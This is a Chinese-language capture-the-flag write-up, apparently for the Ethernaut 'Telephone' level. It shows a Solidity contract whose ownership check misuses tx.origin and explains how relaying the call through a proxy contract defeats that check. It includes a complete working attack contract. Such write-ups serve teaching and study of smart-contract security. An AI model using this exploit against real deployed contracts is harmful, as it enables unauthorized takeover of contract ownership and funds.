# 4. Telephone
### 原题
```
获得下面合约来完成这一关

```
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```
### 分析
这道题又是让我们想办法获取所有权。唯一能下手的地方就是changeOwner()这个函数了。最关键的是要满足“tx.origin != msg.sender”。tx.origin是什么。origin表示是交易的最初发起者。msg.sender又是什么。sender是消息的直接调用者。什么时候最初发起者和消息调用者可以不同的呢？中间加个桥，加个转发。就像神秘大佬从来不会抛头露面，一般都是有自己的代理人出面打理。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external ;
}

contract TelephoneAttack{

    ITelephone telephone;
    
    constructor(address _telephone)  {
        telephone = ITelephone(_telephone);
    }

    function changeOwnerAttack() public returns (bool){
      // 站在攻击合约的角度，msg.sender可能是我的钱包账号
      // 站在被攻击合约的角度，msg.sender是攻击合约的地址
      // tx.origin就是我的钱包账号(我调用攻击合约，发起攻击)，被攻击合约收到的msg.sender是攻击合约地址
      (bool success,) = address(telephone).call(abi.encodeWithSignature("changeOwner(address)", msg.sender));

      return success;
    }
}
```